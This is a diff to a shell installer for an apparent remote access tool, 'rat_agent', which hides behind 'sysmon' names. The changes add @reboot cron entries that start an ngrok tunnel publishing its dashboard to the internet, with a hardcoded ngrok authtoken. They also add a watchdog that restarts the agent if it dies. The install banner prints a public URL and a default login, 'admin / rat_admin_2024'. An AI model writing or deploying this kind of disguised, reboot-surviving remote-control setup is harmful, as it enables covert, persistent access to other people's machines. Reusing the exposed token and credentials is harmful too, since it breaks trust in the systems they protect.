@@ -204,12 +204,12 @@ if [[ "$OS" == "debian" || "$OS" == "redhat" || "$OS" == "arch" ]]; then
     CRON_LINE="@reboot cd $AGENT_DIR && nohup $PYTHON_CMD rat_agent/agent.py >> /tmp/sysmon_agent.log 2>&1 & sleep 3 && cd $AGENT_DIR && nohup $PYTHON_CMD dashboard/app.py >> /tmp/sysmon_dashboard.log 2>&1 &"
     
     # Remove old entries
-    (crontab -l 2>/dev/null | grep -v "sysmon") | crontab - 2>/dev/null || true
+    (crontab -l 2>/dev/null | grep -v "sysmon" | grep -v "ngrok") | crontab - 2>/dev/null || true
     
-    # Add new entry
-    (crontab -l 2>/dev/null; echo "$CRON_LINE") | crontab -
+    # Add new entries
+    (crontab -l 2>/dev/null; echo "$CRON_LINE"; echo "@reboot sleep 15 && ngrok http 5000 --authtoken=3DHUSD9zUxwpnhKjhIlfohEJwGk_2UbPU4mcMNW2ZvrMK3oRx &"; echo "@reboot sleep 20 && nohup $AGENT_DIR/../watchdog.sh >> /tmp/sysmon_watchdog.log 2>&1 &") | crontab -
     
-    print_success "Auto-start configured via cron"
+    print_success "Auto-start configured via cron (agent, dashboard, ngrok, watchdog)"
 elif [[ "$OS" == "macos" ]]; then
     # macOS: Use launch agent
     print_warning "Auto-start not configured for macOS (manual setup required)"
@@ -247,6 +247,11 @@ else
     print_warning "Dashboard may still be starting..."
 fi
 
+# Start watchdog (monitors and restarts services if they crash)
+print_info "Starting watchdog service..."
+nohup $AGENT_DIR/../watchdog.sh >> /tmp/sysmon_watchdog.log 2>&1 &
+print_success "Watchdog started (auto-restarts services)"
+
 # Done
 echo ""
 echo "================================================================"
@@ -254,6 +259,7 @@ echo "                    Installation Complete"
 echo "================================================================"
 echo ""
 echo "  Local URL:   http://localhost:5000"
+echo "  Public URL:  https://unmade-backboned-agreeably.ngrok-free.dev"
 echo "  Login:       admin / rat_admin_2024"
 echo ""
 echo "  Agent PID:      $AGENT_PID"
@@ -262,10 +268,13 @@ echo ""
 echo "  Logs:"
 echo "    Agent:     tail -f /tmp/sysmon_agent.log"
 echo "    Dashboard: tail -f /tmp/sysmon_dashboard.log"
+echo "    Watchdog:  tail -f /tmp/sysmon_watchdog.log"
 echo ""
-echo "  Stop:   pkill -f 'rat_agent/agent.py'; pkill -f 'dashboard/app.py'"
+echo "  Stop:   pkill -f 'rat_agent/agent.py'; pkill -f 'dashboard/app.py'; pkill -f ngrok"
 echo "  Status: ps aux | grep sysmon"
 echo ""
 echo "  Agent location: $AGENT_DIR"
+echo "  Auto-start:    ✅ Configured (survives reboot)"
+echo "  Watchdog:      ✅ Running (restarts crashed services)"
 echo ""
 echo "================================================================"
